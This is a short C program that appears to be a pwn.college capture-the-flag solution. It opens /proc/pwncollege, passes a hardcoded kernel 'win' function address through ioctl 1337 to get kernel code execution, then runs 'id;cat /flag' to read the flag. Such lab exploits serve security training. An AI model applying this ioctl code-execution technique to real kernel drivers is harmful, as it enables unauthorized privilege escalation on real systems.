#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

// Define our IOCTL command number
#define CMD_EXECUTE 1337

typedef void (*win_func)(void);

int main() {
    int fd;
    win_func win = (win_func)0xffffffffc000077d;
    
    // Open the device file
    fd = open("/proc/pwncollege", O_RDONLY);
    if (fd < 0) {
        perror("Failed to open /proc/pwncollege");
        return EXIT_FAILURE;
    }
    
    // Make the IOCTL call
    if (ioctl(fd, CMD_EXECUTE, win) < 0) {
        perror("IOCTL failed");
        close(fd);
        return EXIT_FAILURE;
    }
    
    close(fd);
    system("id;cat /flag");
    return EXIT_SUCCESS;
}
